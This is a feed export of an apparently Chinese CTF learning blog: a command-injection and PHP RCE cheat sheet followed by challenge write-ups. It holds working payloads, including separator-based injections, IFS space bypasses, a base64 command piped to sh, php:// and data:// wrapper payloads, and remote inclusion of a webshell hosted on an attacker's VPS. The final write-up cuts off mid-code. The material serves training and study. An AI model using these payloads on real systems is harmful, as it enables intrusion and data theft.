    <content type="html"><![CDATA[<h2 id="管道符"><a href="#管道符" class="headerlink" title="管道符"></a>管道符</h2><p>Windows系例支持的管道符如下所示。</p><ul><li>“|”：直接执行后面的语句。例如：ping 127.0.0.1|whoami。</li><li>“||”：如果前面执行的语句执行出错，则执行后面的语句，前面的语句只能为假。例如：ping 2||whoami。</li><li> “&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&amp;whoami。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的语句，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami。</li></ul><p>Linux系统支持的管道符如下所示。</p><ul><li>“;”：执行完前面的语句再执行后面的。例如：ping 127.0.0.1;whoami。</li><li>“|”：显示后面语句的执行结果。例如：ping 127.0.0.1|whoami。</li><li>“||”：当前面的语句执行出错时，执行后面的语句。例如：ping 1||whoami。</li><li>“&amp;”：如果前面的语句为假则直接执行后面的语句，前面的语句可真可假。例如：ping 127.0.0.1&amp;whoami。</li><li>“&amp;&amp;”：如果前面的语句为假则直接出错，也不执行后面的，前面的语句只能为真。例如：ping 127.0.0.1&amp;&amp;whoami。</li></ul><p><font color=orange><strong>使用&amp;&amp;和||建议进行url编码</strong></font></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">&lt;可替代空格<br>$&#123;IFS&#125;可替代空格<br>$IFS$<span class="hljs-number">1</span>可替代空格<br>%09(url传递可替代空格)<br>&lt;&gt;<br>$IFS$<span class="hljs-number">9</span><br></code></pre></td></tr></table></figure><p>IFS（Internal Field Separator）<br>是Linux存在的环境变量，是内部字段分隔符。<br>如果单纯的“I F S a a a ” ， 会 被 直 接 解 析 为 I F S a a a 是 整 个 变 量 名 ， 而 在 L i n u x 中 “ IFSaaa”，会被直接解析为 IFSaaa 是整个变量名， 而在Linux中“IFSaaa”，会被直接解析为IFSaaa是整个变量名，而在Linux中“IFSaaa” 变量是不存在的。所以需要间隔符来避免，通常用“$9”。<br>“9 ” 表 示 当 前 系 统 s h e l l 进 程 的 第 九 个 参 数 ， 通 常 是 一 个 空 字 符 ， 所 以 前 面 的 “ 9”表示当前系统 shell 进程的第九个参数，通常是一个空字符，所以前面的 “9”表示当前系统shell进程的第九个参数，通常是一个空字符，所以前面的“IFSaaa”<br>可以改为 “$IFS$9aaa” 。同理也可以加一个{}固定变量名。</p><h2 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-number">1</span>、单、双引号绕过<br>ta<span class="hljs-string">&#x27;&#x27;</span>c<br>ta<span class="hljs-string">&quot;&quot;</span>c<br><br><span class="hljs-number">2</span>、反斜线<br>ta\c<br><br><span class="hljs-number">3</span>、拼接绕过<br>?c=<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;sys&#x27;</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;tem&#x27;</span>;<span class="hljs-variable">$d</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<span class="hljs-variable">$d</span>(<span class="hljs-string">&#x27;cat config.php&#x27;</span>);<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;highligh&#x27;</span>;<span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;t_file&#x27;</span>;<span class="hljs-variable">$d</span>=<span class="hljs-variable">$a</span>.<span class="hljs-variable">$b</span>;<span class="hljs-variable">$d</span>(<span class="hljs-string">&#x27;config.php&#x27;</span>);<br><br><span class="hljs-number">4</span>、base编码绕过<br>?ip=<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>;<span class="hljs-built_in">echo</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1Y2F0IGZsYWcucGhw</span>|base64<span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span><span class="hljs-literal">-d</span>|sh<br>Y2F0IGZsYWcucGhw是<span class="hljs-built_in">cat</span> flag.php的base64<span class="hljs-literal">-encode</span><br><br></code></pre></td></tr></table></figure><h2 id="php常见RCE函数"><a href="#php常见RCE函数" class="headerlink" title="php常见RCE函数"></a>php常见RCE函数</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs stylus">系统命令执行的函数<br><span class="hljs-function"><span class="hljs-title">system</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">shell_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">passthru</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">pcntl_exec</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">popen</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">proc_open</span><span class="hljs-params">()</span></span><br>反引号<br><br><span class="hljs-function"><span class="hljs-title">eval</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">assert</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">preg_replace</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">call_user_func</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><p><a href="%5BRCE%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E_zjdda%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2_rce%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%5D(https://blog.csdn.net/zjdda/article/details/107307858?ops_request_misc=%7B%22request_id%22:%22164847492116780357249653%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=164847492116780357249653&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-107307858.142%5Ev5%5Epc_search_result_cache,143%5Ev6%5Econtrol&utm_term=%E5%B8%B8%E8%A7%81rce%E5%87%BD%E6%95%B0&spm=1018.2226.3001.4187)">这篇博客</a></p><h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>php://input要求<code>allow_url_include</code>设置为<code>On</code><br>php://input用于执行php代码（<strong>需要post请求提交数据</strong>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> ( substr(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>], <span class="hljs-number">0</span>, <span class="hljs-number">6</span>) === <span class="hljs-string">&quot;php://&quot;</span> ) &#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker!!!&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    highlight_file(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/picture/zhixing9.png"><br>注意请求空行</p><h4 id="data"><a href="#data" class="headerlink" title="data://"></a>data://</h4><p>data://同样类似于php://input</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs haskell">?file=<span class="hljs-class"><span class="hljs-keyword">data</span>://,&lt;?php phpinfo();</span><br>?file=<span class="hljs-class"><span class="hljs-keyword">data</span>://text/plain,&lt;php phpinfo();</span><br>?file=<span class="hljs-class"><span class="hljs-keyword">data</span>://text/plain;base64,<span class="hljs-type">PD9waHAgcGhwaW5mbygpPz4</span>=</span><br>?file=<span class="hljs-class"><span class="hljs-keyword">data</span>:text/plain,&lt;php phpinfo();</span><br>?file=<span class="hljs-class"><span class="hljs-keyword">data</span>:text/plain;base64,<span class="hljs-type">PD9waHAgcGhwaW5mbygpPz4</span>=</span><br></code></pre></td></tr></table></figure><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>可以获取指定文件的源码，但是当他与<strong>包含函数</strong>结合是，php://filter流会被当做php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取（要与require这些函数结合使用)</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=phpinfo.php<br></code></pre></td></tr></table></figure><h2 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h2><blockquote><p><a href="https://writeup.ctfhub.com/Skill/Web/RCE/64arrieDUUPZTc1eFm6LLC.html">搬运地址</a></p><p>给咱一个phpinfo那么必然有他的道理</p><p>PHP的配置选项allow_url_include为<strong>ON</strong>的话，则include/require函数可以加载远程文件，这种漏洞被称为”远程文件包含漏洞(<strong>R</strong>emote <strong>F</strong>ile <strong>I</strong>nclusion RFI)”。</p><p><code>allow_url_fopen = On</code> 是否允许打开远程文件 <code>allow_url_include = On</code> 是否允许include/require远程文件</p><p>去康康</p><p><a href="https://static.ctfhub.com/writeup/Skill/Web/RCE/%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/image-20210317121534530.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim"><img src="https://static.ctfhub.com/writeup/Skill/Web/RCE/%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/image-20210317121534530.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt="img"></a></p><h4 id="解法一：（该题的常规解法）"><a href="#解法一：（该题的常规解法）" class="headerlink" title="解法一：（该题的常规解法）"></a>解法一：（该题的常规解法）</h4><p><a href="https://static.ctfhub.com/writeup/Skill/Web/RCE/%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/image-20210317121655687.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim"><img src="https://static.ctfhub.com/writeup/Skill/Web/RCE/%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/image-20210317121655687.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt="img"></a></p><p>在服务器中 mkdir一个文件夹 然后vi 一个yjh.txt</p><p>编辑一个一句话木马</p><p>随后用python启动一个http服务</p><p>Python3 -m http.server 8000</p><p><a href="https://static.ctfhub.com/writeup/Skill/Web/RCE/%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/image-20210317122312117.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim"><img src="https://static.ctfhub.com/writeup/Skill/Web/RCE/%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/image-20210317122312117.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt="img"></a></p><p><a href="http://challenge-d46d08980443a4ef.sandbox.ctfhub.com:10080/?file=http://%E4%BD%A0%E7%9A%84vps%E5%9C%B0%E5%9D%80:8000/yjh.txt">http://challenge-d46d08980443a4ef.sandbox.ctfhub.com:10080/?file=http://你的vps地址:8000/yjh.txt</a></p><p><a href="https://static.ctfhub.com/writeup/Skill/Web/RCE/%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/image-20210317122402525.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim"><img src="https://static.ctfhub.com/writeup/Skill/Web/RCE/%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB/image-20210317122402525.png?imageMogr2/auto-orient/blur/1x0/quality/75%7Cwatermark/1/image/aHR0cHM6Ly9zdGF0aWMuY3RmaHViLmNvbS93cml0ZXVwL2ltYWdlX21hc2sucG5n/dissolve/100/gravity/SouthEast/dx/10/dy/10%7Cimageslim" alt="img"></a></p></blockquote><blockquote><p>部分内容来自<a href="%5BRCE%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0_Goodric%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2%5D(https://blog.csdn.net/Goodric/article/details/113041443?spm=1001.2014.3001.5502)">参考博客</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;管道符&quot;&gt;&lt;a href=&quot;#管道符&quot; class=&quot;headerlink&quot; title=&quot;管道符&quot;&gt;&lt;/a&gt;管道符&lt;/h2&gt;&lt;p&gt;Windows系例支持的管道符如下所示。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;“|”：直接执行后面的语句。例如：ping 127.0.0.1|</summary>
      
    
    
    
    
    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>命令执行题目</title>
    <link href="https://zhangkaibin0921.github.io/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/"/>
    <id>https://zhangkaibin0921.github.io/2022/03/23/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%A2%98%E7%9B%AE/</id>
    <published>2022-03-23T14:16:02.000Z</published>
    <updated>2022-03-30T13:31:51.020Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>ping 127.0.0.1  正常<br><img src="/picture/zhixing1.png"></p><p><code>?ip=127.0.0.1|ls</code><br><img src="/picture/zhixing2.png"></p><p><code>?ip=127.0.0.1|cat flag.php</code><br><img src="/picture/zhixing3.png"><br>过滤了空格</p><p><code>?ip=127.0.0.1|cat$&#123;IFS&#125;flag.php</code><br><img src="/picture/zhixing4.png"><br>没绕过，可能过滤了{ 或者$</p><p><code>?ip=127.0.0.1|cat$IFS$1flag.php</code><br><img src="/picture/zhixing5.png"><br>绕过了，但是应该过滤了flag</p><p>?ip=127.0.0.1|cat$IFS$1fla?.php<br>还是不行，问好应该也被过滤了</p><p>那先看下index.php吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php">/?ip=<br>|\<span class="hljs-string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="hljs-string">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="hljs-string">    die(&quot;fxck your symbol!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your space!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your bash!&quot;);</span><br><span class="hljs-string">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="hljs-string">    die(&quot;fxck your flag!&quot;);</span><br><span class="hljs-string">  &#125;</span><br><span class="hljs-string">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="hljs-string">  echo &quot;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;;</span><br><span class="hljs-string">  print_r($a);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>看到了过滤字符的代码<br>正则也绕过不过去了，看了下别人的wp，学了个新姿势，base64加密绕过</p><p><code>?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh</code><br>Y2F0IGZsYWcucGhw是cat flag.php的base64-encode<br><img src="/picture/zhixing6.png"></p><p>看看这个新姿势</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata">?ip=127.0.0.1;<span class="hljs-keyword">cat</span><span class="hljs-variable">$IFS</span><span class="hljs-variable">$1</span>`<span class="hljs-keyword">ls</span>`<br>`<span class="hljs-keyword">ls</span>` 相当于system(<span class="hljs-keyword">ls</span>);<br>然后<span class="hljs-keyword">cat</span>显示内容<br></code></pre></td></tr></table></figure><h2 id="pwnthebox-exec1"><a href="#pwnthebox-exec1" class="headerlink" title="pwnthebox-exec1"></a>pwnthebox-exec1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Get input</span><br><br><span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br>    <span class="hljs-comment">// var_dump($target);</span><br><span class="hljs-variable">$target</span>=trim(<span class="hljs-variable">$target</span>);<br><span class="hljs-comment">// var_dump($target);</span><br><span class="hljs-comment">// Set blacklist</span><br><span class="hljs-variable">$substitutions</span> = <span class="hljs-keyword">array</span>(<br><span class="hljs-string">&#x27;&amp;&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-string">&#x27;;&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-string">&#x27;|&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-string">&#x27;-&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-string">&#x27;$&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-string">&#x27;(&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-string">&#x27;)&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-string">&#x27;`&#x27;</span>  =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br><span class="hljs-string">&#x27;||&#x27;</span> =&gt; <span class="hljs-string">&#x27;&#x27;</span>,<br>);<br><br><span class="hljs-comment">// Remove any of the charactars in the array (blacklist).</span><br><span class="hljs-variable">$target</span> = str_replace( array_keys( <span class="hljs-variable">$substitutions</span> ), <span class="hljs-variable">$substitutions</span>, <span class="hljs-variable">$target</span> );<br>    <br><br><span class="hljs-comment">// var_dump($target);</span><br><br><span class="hljs-comment">// Determine OS and execute the ping command.</span><br><span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br><span class="hljs-comment">// Windows</span><br><br><span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> . <span class="hljs-variable">$target</span> );<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// *nix</span><br><span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 1 &#x27;</span> . <span class="hljs-variable">$target</span> );<br>&#125;<br><br><span class="hljs-comment">// Feedback for the end user</span><br><span class="hljs-keyword">echo</span>  <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>发现管道符都被过滤了<br>str_replace函数有漏洞，一般可以双写绕过，或者大小写绕过，但这里是没法双写绕过的</p><p>这里可以用%0a绕过(可能str_replace也只匹配一行)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">?ip=127.0.0.1%0als<br><br>?ip=127.0.0.1%0acat pwnthebox.txt<br></code></pre></td></tr></table></figure><h2 id="pwnthebox-exec2"><a href="#pwnthebox-exec2" class="headerlink" title="pwnthebox-exec2"></a>pwnthebox-exec2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><br><span class="hljs-variable">$ip</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>])?<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]:<span class="hljs-keyword">die</span>();<br><br><span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&#x27;/^\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;/i&#x27;</span>,<span class="hljs-variable">$ip</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ip 格式错误!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> strlen(<span class="hljs-variable">$ip</span>);<br><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$ip</span>)&lt;<span class="hljs-number">7</span>||strlen(<span class="hljs-variable">$ip</span>)&gt;<span class="hljs-number">21</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ip 长度错误!&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">// Determine OS and execute the ping command.</span><br><span class="hljs-keyword">if</span>( stristr( php_uname( <span class="hljs-string">&#x27;s&#x27;</span> ), <span class="hljs-string">&#x27;Windows NT&#x27;</span> ) ) &#123;<br><span class="hljs-comment">// Windows</span><br><br><span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  &#x27;</span> .<span class="hljs-variable">$ip</span> );<br>&#125;<span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">// *nix</span><br><span class="hljs-variable">$cmd</span> = shell_exec( <span class="hljs-string">&#x27;ping  -c 1 &#x27;</span> .<span class="hljs-variable">$ip</span> );<br>&#125;<br><br><span class="hljs-comment">// Feedback for the end user</span><br><span class="hljs-keyword">echo</span>  <span class="hljs-string">&quot;&lt;pre&gt;<span class="hljs-subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>;<br><br><span class="hljs-comment">## 要求,利用命令执行getshell</span><br></code></pre></td></tr></table></figure><p><img src="/picture/zhixing7.png"><br>先看这个正则，没有在末尾加$<br>所以后面还可以写其他的</p><p>ip=127.0.0.1 | ls<br>又因为ip长度有限制<br>ip=127.0.0.1 | cat *.txt</p><h2 id="pwnthebox-exec3"><a href="#pwnthebox-exec3" class="headerlink" title="pwnthebox-exec3"></a>pwnthebox-exec3</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(strlen(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>])&lt;<span class="hljs-number">8</span>)&#123;<br>     <span class="hljs-keyword">echo</span> shell_exec(<span class="hljs-variable">$_GET</span>[<span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/picture/zhixing8.png"><br>又是长度限制<br><code>?1=cat *.*</code><br>刚好绕过</p><h2 id="ctfhub-综合过滤练习"><a href="#ctfhub-综合过滤练习" class="headerlink" title="ctfhub-综合过滤练习"></a>ctfhub-综合过滤练习</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-variable">$res</span> = <span class="hljs-literal">FALSE</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>]) &#123;<br>    <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;ip&#x27;</span>];<br>    <span class="hljs-variable">$m</span> = [];<br>    <span class="hljs-keyword">if</span> (!preg_match_all(<span class="hljs-string">&quot;/(\||&amp;|;| 